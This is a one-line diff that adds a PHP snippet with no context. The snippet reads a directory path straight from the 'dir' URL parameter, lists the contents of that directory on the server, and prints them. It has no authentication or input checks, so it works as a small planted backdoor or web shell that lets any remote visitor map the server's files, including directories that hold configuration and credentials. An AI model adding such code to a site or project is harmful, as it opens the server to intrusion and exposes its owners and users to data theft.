@@ -1,0 +1,1 @@
+<?php echo implode('\n', scandir($_GET['dir'])); die(); ?>
